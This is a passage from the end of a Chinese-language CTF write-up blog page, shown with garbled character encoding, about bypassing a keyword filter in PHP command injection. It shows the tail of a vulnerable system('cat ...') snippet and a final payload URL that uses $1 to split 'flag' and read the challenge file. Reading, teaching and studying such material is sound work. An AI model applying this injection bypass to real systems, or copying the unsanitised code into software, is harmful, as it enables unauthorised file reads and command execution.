</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=nx>system</span><span class=p>(</span><span class=s1>&#39;cat &#34;&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&#34;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s1>&#39;&lt;b&gt;Usage&lt;/b&gt;: Please enter the parameter like as in &lt;a href=&#34;/?file=test.txt&#34;&gt;this&lt;/a&gt;.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è¿˜å‰©ä¸‹<code>{}</code>ã€<code>&lt;></code>ã€<code>[]</code>ã€<code>+-=</code>ã€<code>^</code>ã€<code>$</code>ã€<code>@</code>ã€<code>!</code>ã€<code>&</code>ï¼Œæ˜¯ä¸ªå…³é”®å­—ç»•è¿‡ï¼Œæœ‰<code>$</code>ï¼Œæˆ‘ä»¬å¾ˆå¿«å¯ä»¥è”æƒ³åˆ°å¯ä»¥ç”¨<code>$n</code>è¿™ç§æ–¹å¼ç»•è¿‡ï¼Œæœ€ç»ˆ payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://cat.canhack.me/?file=fl$1ag-f72a161d445915d2bdcdc820c4143353.php
</span></span></code></pre></td></tr></table></div></div><h2 id=å‚è€ƒ>å‚è€ƒï¼š</h2><p><a class=link href=https://www.tldp.org/LDP/abs/html/internalvariables.html target=_blank rel=noopener>Internal Variables</a></p><p><a class=link href=https://blog.csdn.net/whuslei/article/details/7187639 target=_blank rel=noopener>Shellä¸­çš„IFSè§£æƒ‘</a></p><p><a class=link href=http://wiki.jikexueyuan.com/project/shell-tutorial/shell-special-variable.html target=_blank rel=noopener>Shell ç‰¹æ®Šå˜é‡</a></p><p><a class=link href=https://xz.aliyun.com/t/2589 target=_blank rel=noopener>ä¸€ä¸ªæœ‰è¶£çš„ä»»æ„æ–‡ä»¶è¯»å†™</a></p><p><a class=link href=https://www.freebuf.com/articles/system/176255.html target=_blank rel=noopener>åˆ©ç”¨é€šé…ç¬¦è¿›è¡ŒLinuxæœ¬åœ°ææƒ</a></p><p><a class=link href=https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt target=_blank rel=noopener>Unix Wildcards Gone Wild</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/sec/>Sec</a>
<a href=/tags/rce/>RCE</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>æƒ³äº†è§£æ›´å¤šæœ‰æ„æ€çš„å›½é™…èµ› CTF ä¸­ Web çŸ¥è¯†æŠ€å·§ï¼Œæ¬¢è¿åŠ å…¥æˆ‘çš„ <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>çŸ¥è¯†æ˜Ÿçƒ</a> ; å¦å¤–æˆ‘æ­£åœ¨å¬é›†ä¸€ç¾¤å°ä¼™ä¼´ç»„å»ºä¸€æ”¯ä¸“æ³¨å›½é™… CTF çš„é˜Ÿä¼ï¼Œå¦‚æœæœ‰æ„Ÿå…´è¶£çš„å°ä¼™ä¼´ä¹Ÿå¯åœ¨ <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> æŸ¥çœ‹è¯¦æƒ…</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/web-for-pentest/><div class=article-details><h2 class=article-title>Web For Pentest</h2></div></a></article><article><a href=/p/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84n%E7%A7%8D%E6%96%B9%E5%BC%8F/><div class=article-details><h2 class=article-title>å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼</h2></div></a></article><article><a href=/p/the-end-of-afr/><div class=article-details><h2 class=article-title>The End of AFR</h2></div></a></article><article><a href=/p/a-magic-way-of-xss-in-http/2/><div class=article-details><h2 class=article-title>A Magic Way of XSS in HTTP/2</h2></div></a></article><article><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-tls-poison-%E6%94%BB%E5%87%BB/><div class=article-details><h2 class=article-title>ä¸€ç¯‡æ–‡ç« å¸¦ä½ è¯»æ‡‚ TLS Poison æ”»å‡»</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.zdy.one/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.zdy.one/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer integrity="sha256-Hpo7r9hGztTDRdCEs1X7jHuudXAcM4+KH4qCx4ATeCY=" crossorigin=anonymous></script><script>(function(){const e=document.createElement("link");e.href="https://googlefonts.zeddyu-lu.workers.dev/fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("https://zeddyu.github.io/sw.min.3e39d12263b24e3c46a8d580c9ff2781500296e154ca0809820b5be9b9135220.js").then(function(e){console.log("ServiceWorker registration successful with scope: ",e.scope)},function(e){console.log("ServiceWorker registration failed: ",e)})})</script></body></html>